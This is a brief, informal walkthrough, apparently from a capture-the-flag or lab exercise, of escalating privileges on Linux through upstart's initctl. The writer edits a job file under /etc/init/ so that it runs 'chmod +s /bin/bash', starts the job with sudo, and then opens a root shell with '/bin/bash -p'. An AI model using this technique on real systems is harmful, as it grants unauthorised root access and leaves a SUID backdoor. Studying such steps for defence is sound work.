https://linux.die.net/man/8/initctl
https://linux.die.net/man/8/init

navigate to /etc/init/ 

edit the file and give the bash root privilege.. 
`chmod +s /bin/bash`

Run
`sudo /sbin/initctl start test4` <br>

here the shell became some buggy, unresponsive so just doing `^c` got out of it, but if all goes fine you should see that this process is running with id. It was shown but it was messed up 

Now run the bash as root

`/bin/bash -p`

got root
